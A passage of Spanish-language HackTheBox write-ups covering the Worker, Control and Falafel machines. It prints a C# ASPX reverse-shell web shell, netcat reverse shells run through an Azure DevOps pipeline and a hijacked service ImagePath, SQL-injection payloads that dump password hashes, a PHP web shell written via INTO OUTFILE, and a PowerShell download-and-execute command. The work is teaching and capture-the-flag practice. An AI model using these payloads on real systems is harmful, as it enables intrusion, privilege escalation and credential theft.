    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,									
        uint dwOpenMode,								
        uint dwPipeMode,								
        uint nMaxInstances,							
        uint nOutBufferSize,						
        uint nInBufferSize,							
        uint nDefaultTimeOut,						
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
 
    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101; 
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Subimos el fichero al proyecto a la rama creada

1. Intentamos ir a la url `http://alpha.worker.htb/shell.aspx`

Aqui vemos un **404**. Quiere decir que vamos a tener que hacer una pull request. Pinchamos a crear una solicitud de incorporacion de cambio.
Una vez esto echo vemos que podemos Establecer autocomplecion y que podemos aprovar el cambio. Esto quiere decir que tenemos el permisso de 
acceptar pull requests.

Si vamos otra vez a `http://alpha.worker.htb/shell.aspx` vemos que todavia no esta este fichero. Parece ser que la Pipeline no se lanza automaticamente
y que tenemos que ejecutarla manualmente.

Si pinchamos en el menu Pipline y que seleccionamos la **Alpha-CI** y le damos a **Ejecutar** y compilamos la rama creada.

ya hemos ganado accesso a la maquina victima.

```bash
whoami

iis apppoo\defaultapppool
```

Vemos que no podemos leer la flag porque no tenemos suficientes derechos.

```bash
whoami /priv
```

Aqui vemos que el `SeImpersonatePrivilege` esta activado y que podriamos passar por hay pero en este caso vamos a continuar por la via normal.

### User pivoting {-}

Si recordamos, cuando hemos analyzado habia una unidad logica `w:\`. Vamos a ver si podemos movernos por hay.

```bash
w:\
dir
```

Si miramos los recursos, hay uno interesante en `w:\svnrepos\www\conf\passwd` que contiene una serie de usuarios y contraseñas. Entre ellos
`robisl` que es un usuario del systema.

```bash
dir C:\Users
net user robisl
```

Vemos que el usuario esta en el grupo `Remote Management Use` que nos permitiria connectar via **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11'
```

Ya podemos visualizar la flag.


<!--chapter:end:32-Worker/32-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
```

Aqui vemos que tenemos menos privilegios que el usuario `iis apppoo\defaultapppool`. Pero si volvemos a la web
`http://devops.worker.htb` y que nos connectamos con este usuario, vemos que hay un proyecto.

Si pinchamos a configuration del proyecto y le damos a seguridad, vemos que el usuario es parte de grupo `Build Administrator`. Este
grupo permite enviar commandos como **nt authority system**.

1. Checkeamos el agente a utilizar

    <div class="figure">
    <img src="images/Worker-grupos-agentes.png" alt="Azure DevOps agente Setup" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-60)Azure DevOps agente Setup</p>
    </div>

1. Creamos una nueva canalizacion

    <div class="figure">
    <img src="images/Worker-nueva-canalizacion.png" alt="Azure DevOps nueva canalizacion" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-61)Azure DevOps nueva canalizacion</p>
    </div>

1. Codigo en Azure repo

    <div class="figure">
    <img src="images/Worker-azur-repo.png" alt="Azure DevOps nueva canalizacion" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-62)Azure DevOps nueva canalizacion</p>
    </div>

1. Seleccionamos el proyecto existente
1. Configuramos la canalizacion con Canalizacion inicial

    <div class="figure">
    <img src="images/Worker-Canalizacion-inicial.png" alt="Azure DevOps canalizacion inicial" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-63)Azure DevOps canalizacion inicial</p>
    </div>

1. Creamos el script pipeline para hacer un whoami

    <div class="figure">
    <img src="images/Worker-whoami-pipeline.png" alt="Azure DevOps pipeline whoami" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-64)Azure DevOps pipeline whoami</p>
    </div>

1. Guardamos en una nueva rama y ejecutamos

    <div class="figure">
    <img src="images/Worker-guardar-ejecutar.png" alt="Azure DevOps guardar pipeline" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-65)Azure DevOps guardar pipeline</p>
    </div>

1. Miramos el resultado 

    <div class="figure">
    <img src="images/Worker-mulit-line-script.png" alt="Azure DevOps whoami" width="80%" />
    <p class="caption">(\#fig:unnamed-chunk-66)Azure DevOps whoami</p>
    </div>

Aqui comprobamos que script esta lanzado por `nt authority\system`

1. Uploadeamos un netcat a la maquina victima
    
    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    ```

1. Desde evil-winrm, uploadeamos el fichero

    ```bash
    cd C:\Windows\Temp
    mkdir Privesc
    cd  Privesc
    upload nc.exe
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Editamos el pipeline script

    ```yaml
    trigger:
    - master

    pool: 'Setup'

    steps:
    - script: echo Hello, world!
      displayName 'Run a one-line script'

    - script: C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.10 443
      displayName: 'Run a multi-line script'
    ```

1. Le damos a ejecutar

```bash
whoami

nt authority\system
```

Ya podemos leer la flag.

<!--chapter:end:32-Worker/32-04-PrivilegeEscalation.Rmd-->

# Control {-}

## Introduccion {-}

La maquina del dia 25/08/2021 se llama Control.

El replay del live se puede ver aqui

[![S4vitaar Control maquina](https://img.youtube.com/vi/ig7wv4IdwiQ/0.jpg)](https://www.youtube.com/watch?v=ig7wv4IdwiQ)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:33-Control/33-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.167
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.167
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.167 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,3306,49666,49667 10.10.10.167 -oN targeted
```


| Puerto | Servicio | Que se nos occure?   | Que falta? |
| ------ | -------- | -------------------- | ---------- |
| 80     | http     | Web, Fuzzing         |            |
| 135    | msrpc    |                      |            |
| 3306   | mysql    | SQLI                 |            |
| 49666  | msrpc    | puertos por defectos |            |
| 49667  | msrpc    | puertos por defectos |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.167
```

Nos enfrentamos a un Microsoft IIS 10.0 con PHP 7.3.7.

#### http-enum {-}

Lanzamos un web scan con nmap.

nmap --script http-enum -p80 10.10.10.167 -oN webScan

Nos detecta la routa `admin`

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.167/FUZZ
```

Encontramos las routas `uploads`, `admin`

### Analyzando la web con Firefox {-}

Entramos en una pagina, hay un boton admin en el menu y uno login.
Si miramos el codigo fuente vemos un comentario una Todo List:

- Import products
- Link to new payment system
- Enable SSL (Certificates location \\192.168.4.28\myfiles)

El ultimo en este caso es muy interesante.

Si pinchamos el link admin, vemos un mensaje **Acces Denied: Header Missing. Please ensure you go through the proxy to access this page**.
En este caso cuando se habla de proxy y de cabezera podemos uzar la heramienta **curl** con la cabezera **X-Forwarded-for**

### Cabezera proxy {-}

```bash
curl -s -X GET "http://10.10.10.167/admin.php" -H "X-Forwarded-For: 192.168.4.28"
```

Aqui vemos que nos a cargado una pagina.

```bash
curl -s -X GET "http://10.10.10.167/admin.php" -H "X-Forwarded-For: 192.168.4.28" | html2text
```

Como vemos informaciones interesantes, vamos a tirar de **burpsuite** para ver la informacion de manera normal.

### Añadir cabezera desde Burpsuite {-}

Una vez el burpsuite configurado con la maquina victima de target, vamos a añadir una cabezera. Lo podemos hacer de 2 maneras:

- Manual (cambiando de manera manual a cada peticion el header)
- Automatizada (que cada peticion use este header)

1. Pinchamos a Proxy > Options
1. Add Match and Replace

    <div class="figure">
    <img src="images/Control-burp-xforwardingfor.png" alt="Azure DevOps repositories" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-67)Azure DevOps repositories</p>
    </div>

1. Interceptamos y vemos que se añade la cabezera
1. Desactivamos el intersepte 

Ya podemos navegar de manera normal.

Vemos una pagina con productos y un input para buscar productos. Si escribimos un producto, aparece una tabla con un titulo **id**.

Probamos poner un apostrofe `'` en el input de busqueda y nos sale un error SQL `Error SQLSTATE[42000] Syntax error or access violation You have an error in your SQL
syntax, check the manual that corresponds to your MariaDB server version for the right syntax to use near "'" at line 1`

<!--chapter:end:33-Control/33-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}


### SQL Injection Error Based con Python {-}

La idea aqui es crear un script en python que nos injecte el comando deseado y que filtre la respuesta al lado del servidor que 
queremos.

```python
#!/usr/bin/python3

import requests
import re
import signal
import sys
import time

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables_globales
sqli_url = "http://10.10.10.167/search_products.php"

def makeRequest(injection):
    post_data = {
        'productName: '%s' % injection
    }

    headers = {
        'X-Forwarded-For': '192.168.4.28'
    }

    r = requests.post(sqli_url, data=post_data, headers=headers)
    response = re.findall(r'\<tbody\>\r\n\t\t\t\t\t\t\t(.*?)\t\t\t\t\t\t\<\/tbody\>', r.text[0])

    print("\n + response + \n")


if __name__ == '__main__':
    while True:
        injection = input("[+] Payload: ")
        if injection != "exit":
            makeRequest(injection)
        else:
            print("\n[!] Saliendo...\n")
            sys.exit(0)

```

si lanzamos el script con `rlwrap python3 sqli_injection.py` y a la entrada payload le ponemos el apostrofe, podemos ver el error. Ya podemos enumerar
la base de datos.

1. Miramos cuantas columnas hay

    ```bash
    [+] Payload : ' order by 100-- -
    [+] Payload : ' order by 10-- -
    [+] Payload : ' order by 8-- -
    [+] Payload : ' order by 7-- -
    [+] Payload : ' order by 6-- -
    ```

    Al `' order by 6-- -` nos sale No product Found, ya sabemos que hay 6 columnas

1. Aplicamos el union select

    ```bash
    [+] Payload : ' union select 1,2,3,4,5,6-- -
    ```

    Vemos que se estan colandos la etiquetas

1. Listamos la base de datos actual en uso y el usuario

    ```bash
    [+] Payload : ' union select 1,2,database(),4,5,6-- -
    [+] Payload : ' union select 1,2,version(),4,5,6-- -
    [+] Payload : ' union select 1,2,user(),4,5,6-- -
    ```

    La base de datos se llama warehouse de typo MariaDB version 10.4.8 y el usuario manager@localhost

1. Miramos si podemos leer archivos de la maquina victima

    ```bash
    [+] Payload : ' union select 1,2,load_file("C:\Windows\System32\drivers\etc\hosts"),4,5,6-- -
    [+] Payload : ' union select 1,2,load_file("Windows\System32\drivers\etc\hosts"),4,5,6-- -
    [+] Payload : ' union select 1,2,load_file("0x433a5c57696e646f77735c53797374656d33325c647269766572731b74635c686f737473"),4,5,6-- -
    ```

    Parece que no podemos leer ficheros del systema.

    > [ ! ] NOTAS: el hexadecimal se hace con el comando `echo "C:\Windows\System32\drivers\etc\hosts" | tr -d '\n' | xxd -ps | xargs | tr -d ' '`

1. Enumeramos las tablas existentes de la base de datos

    ```bash
    [+] Payload : ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="warehouse"-- -
    ```

    Vemos que hay una tabla product, product_category y product_pack. No parece que haya informacion relevante.

1. Enumerar las bases de datos del systema

    ```bash
    [+] Payload : ' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
    ```

    Hay 3 bases de datos information_schema, mysql y warehouse.

1. Enumeramos la base de datos mysql

    ```bash
    [+] Payload : ' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema="mysql"-- -
    ```

    Hay muchas tablas y una es la tabla user

1. Enumeramos las columnas de la tabla user

    ```bash
    [+] Payload : ' union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema="mysql" and table_name="user"-- -
    ```

    Existe una columna user y una password

1. Accedemos a los usuarios y contraseñas de la base de datos

    ```bash
    [+] Payload : ' union select 1,2,group_concat(User,0x3a,Password),4,5,6 from mysql.user-- -
    ```

Copiamos los usuarios y la contraseñas en un fichero llamado hashes.

### Crackeamos las contraseñas con crackstation {-}

Tratamos las informaciones del fichero hash
 
```bash
cat hashes | tr ',' '\n' | sed 's/\*//g' | sort -u > hashes
cat hashes | awk '{print $2}' FS=":" | xclip -sel clip
```

Abrimos la web de [crackstation](https://crackstation.net/) y colamos los hashes. Encontramos las contraseñas de hector y de manager.

Aqui el problema es que no tenemos puertos que nos permite conectar a la maquina de manera directa. Tenemos que intentar otra cosa para 
poder ganar accesso al systema.

<!--chapter:end:33-Control/33-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con SQL Injection {-}

Lo que vamos a intentar hacer, es escribir en un fichero usando la **SQLI**. Esto se puede hacer con el commando
`into outfile`. Como savemos que la web es un IIS la routa por defecto de windows para hostear las webs de IIS es
`C:\inetpub\wwwroot` y hemos encontrado una routa `/uploads` intentamos ver si podemos escribir nuevos ficheros.

```bash
rlwrap python3 sqli_injection.py
[+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\test.txt-- -
[+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\\inetpub\\wwwroot\\uploads\\test.txt-- -
```

Si vamos a la url `http://10.10.10.167/uploads/test.txt` vemos el fichero creado. Intentamos injectar codigo malicioso

```bash
rlwrap python3 sqli_injection.py
[+] Payload : ' union select 1,2,"<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"; ?>",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\s4vishell.php-- -
```

Ya podemos comprobar que podemos ejecutar comandos en la url `http://10.10.10.167/uploads/s4vishell.php?cmd=whoami`. 

Vamos a por ganar accesso al systema

1. Descargamos la nueva full TTY powershell

    ```bash
    git clone https://github.com/antonioCoco/ConPtyShell
    cd ConPtyShell
    stty size
    vi Invoke-ConPtyShell.ps1
    ```

1. Añadimos lo siguiente al final del fichero

    ```bash
    Invoke-ConPtyShell -RemoteIp 10.10.14.15 -RemotePort 443 -Rows 51 -Cols 189
    ```

1. Compartimos un servidor web con python

    ```bash`
    python3 -m http.server 80
    ``

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos y ejecutamos el ficher Invoke-ConPtyShell.ps1

    ```bash
    http://10.10.10.167/uploads/s4vishell.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString("http://10.10.14.15/Invoke-ConPtyShell.ps1")
    ```

Ya tenemos accesso al systema

### Tratamiento de la TTY {-}

```bash
^Z
stty raw -echo; fg
-> enter
-> enter

whoami
#output
error

cd C:\
#output
error
```

Los dos primeros commandos nos da un error pero a partir de aqui, ya tenemos una full tty shell.

### Enumerando el systema {-}

```bash
cd Users/
dir
cd Hector
dir
#Output
Error

cd ../Administrator
dir
#Output
Error
```

No tenemos derechos para entrar en los directorios de los Usuarios. Pero tenemos una contraseña para el usuario Hector.

### User pivoting al usuario hector {-}

Vemos si podemos lanzar commandos como el usuario hector.

```bash
hostname
#Output
Fidelity

$user = 'fidelity\hector'
$password = 'l33th4x0rhector'
$secpw = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCrendential $user,$secpw
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {whoami}
#Output
control\hector
```

Hemos podido lanzar un script enjaolado sobre un Blocke como si fuera el usuario hector que lo ejecutara.
La idea aqui es entablarnos una reverse shell ejecutada como el usuario hector.

1. Enviamos un nc.exe a la maquina victima

    - en la maquina de atacante

        ```bash
        locate nc.exe
        cp /usr/share/sqlninja/apps/nc.exe .
        impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
        ```

    - en la maquina victima

        ```bash
        cd C:\Windows\Temp
        mkdir userPivoting
        cd userPivoting
        net use x: \\10.10.14.15\smbFolder /user:s4vitar s4vitar123
        copy x:\nc.exe nc.exe
        ```

1. Lanzamos la reverse shell como el usuario hector

    - en la maquina de atacante

        ```bash
        rlwrap nc -nlvp 443
        ```

    - en la maquina victima

        ```bash
        Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {C:\Windows\Temp\userPivoting\nc.exe -e cmd 10.10.14.15 443 }
        ```

        tenemos un error, quiere decir que tenemos que passar por un **AppLockerByPass**. Las routas se pueden encontrar en [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md).

        ```bash
        cp nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
        C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443
        ```

Ya hemos ganado acceso al systema como el usuario hector y podemos ver la flag.

<!--chapter:end:33-Control/33-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
whoami /priv
```

Como no tenemos posibilidades de escalar privilegios con un seImpersonatePrivilege por ejemplo, vamos a tener que enumerar el systema

```bash
cd C:\Windows\Temp
mkdir privesc
```

Descargamos el [**Winpeas.exe**](https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).
Cancelamos el recurso smb y creamos un nuevo para transferir el fichero.

```bash
mv /home/s4vitar/Descargas/winPEASx64.exe ./winpeas.exe
impacket-smbserver smbFolderr $(pwd) -smb2support -username s4vitar -password s4vitar123
```

y lo transferimos a la maquina victima

```bash
net use y: \\10.10.14.15\smbFolderr /user:s4vitar s4vitar123
copy y:\winpeas.exe winpeas.exe
dir
winpeas.exe
```

El winpeas.exe nos reporta que el usuario Hector tiene fullControl sobre bastante servicios, uno de ellos es el seclogon.


<div class="figure">
<img src="images/Control-Hector-services-fullControl.png" alt="Hector service fullControl" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-68)Hector service fullControl</p>
</div>

Si lanzamos el commando `sc query seclogon` vemos que el servicio esta apagado pero podriamos lanzarlo configurando la manera que queremos que arranque.

```bash
reg query "HKLM\system\currentcontrolset\services\seclogon"
```

<div class="figure">
<img src="images/Control-reg_expand_sz.png" alt="service seclogon reg-expand-sz" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-69)service seclogon reg-expand-sz</p>
</div>

La idea aqui es que el **ImagePath**, mejor dicho el svchost.exe se ejecuta directamente a la hora que lanzamos el servicio y este binario esta ejecutado
por el usuario administrador. La idea aqui es tomar el control del **ImagePath** para que valga otra cosa.

```bash
reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443" /f
```

Ya podemos comprobar con el commando `reg query "HKLM\system\currentcontrolset\services\seclogon"` que el ImagePath a sido cambiado.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. arrancamos el servicio

    ```bash
    sc start seclogon
    ```

ya hemos ganado accesso al systema como `nt authority\system` y podemos leer la flag.

<!--chapter:end:33-Control/33-04-PrivilegeEscalation.Rmd-->

# Falafel {-}

## Introduccion {-}

La maquina del dia 26/08/2021 se Falafel.

El replay del live se puede ver aqui

[![S4vitaar Falafel maquina](https://img.youtube.com/vi/CIAwmGsHfWk/0.jpg)](https://www.youtube.com/watch?v=CIAwmGsHfWk)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:34-Falafel/34-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.73
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.73
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.73 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,2222 10.10.10.73 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |




### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.73
```

Vemos un dominio `falafel.htb` y poco mas. Añadimos el dominio al `/etc/hosts`

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.73/FUZZ
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php-txt http://10.10.10.73/FUZZ.FUZ2Z
```

Aqui vemos routas importantes como:

- robots.txt
- login.php
- upload.php
- cyberlaw.txt

#### Analyzando la web con Firefox {-}

Analyzando la web vemos que hay un email `IT@falafel.htb`, aqui podemos pensar que IT es un usuario. Vemos el panel de login.
